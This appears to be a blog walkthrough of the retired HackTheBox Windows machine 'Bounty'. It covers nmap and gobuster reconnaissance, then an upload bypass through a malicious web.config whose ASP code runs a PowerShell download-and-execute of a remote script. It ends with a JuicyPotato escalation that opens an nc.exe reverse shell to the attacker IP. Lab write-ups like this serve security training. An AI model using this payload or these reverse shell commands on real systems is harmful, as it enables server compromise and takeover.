---
title: Bounty - HackTheBox Walkthrough
date: 2021-11-09 12:00:00 
categories: [HackTheBox,Windows]
tags: [iss,juicy potato]
img_path: /assets/img/HTB/Bounty/
image: 
  path: 00-banner.png
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Bounty` a retired windows machine from HackTheBox rated easy. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we'll start with a nmap scan to discover the open ports and services.
```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Tue Nov  2 14:00:56 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.248.27
Nmap scan report for 10.129.248.27
Host is up (0.13s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  2 14:01:16 2021 -- 1 IP address (1 host up) scanned in 20.04 seconds
```

## HTTP Enumeration
The site displays a image of a wizard.

![01-web](01-web.png)

Using `gobuster` we found `transfer.aspx` and `/UploadedFiles`

```console
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.248.27/ -t 100 -x aspx
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.248.27/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              aspx
[+] Timeout:                 10s
===============================================================
2021/11/02 14:03:41 Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
/UploadedFiles        (Status: 301) [Size: 158] [--> http://10.129.248.27/UploadedFiles/]

===============================================================
2021/11/02 14:05:25 Finished
===============================================================
```

`transfer.aspx` allow us to upload a image.

![02-web](02-web.png)

After submit a png file we can display it going to: `http://10.129.248.27/UploadedFiles/[file-name].png`

![03-web](03-web.png)
# Initial Foothold
Testing some [iis file extensions](https://hahndorf.eu/blog/iisfileextensions.html) to see what kind of file we can upload, we discover that the site allows `.config` if we use this extension we'll be able to [execute commands](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/).

First I tried a basic arithmetic operation `1+2`:

![04-web](04-web.png)

It works, so let's execute a [ASP reverse shell](https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html), create `web.config` file and insert into it the next code.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
    Call oS.Run("powershell.exe /c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.89/rev.ps1')",0,True)
%>
-->
```
Copy [Nishang’s Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), uncomment the second line, change the ip and the listener port.

![05-nishang](05-nishang.png)

Upload the web.config using the web form, create a python HTTP Server and visit `http://10.129.248.27/UploadedFiles/web.config`,

![06-shell](06-shell.png)
# Privilage Escalation
`SeImpersonatePrivilege` is enable which means it might be vulnerable to [Juicy Potato](https://github.com/ohpe/juicy-potato/releases)

![07-juicy](07-juicy.png)

Let's upload `nc.exe` and `JuicyPotato.exe` to the victime machine, then execute the next:
```plaintext
.\JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.89 443" -t *
```
We recived a reverse shell and we can read root.txt

![08-root](08-root.png)

That’s it for now guys. Until next time.
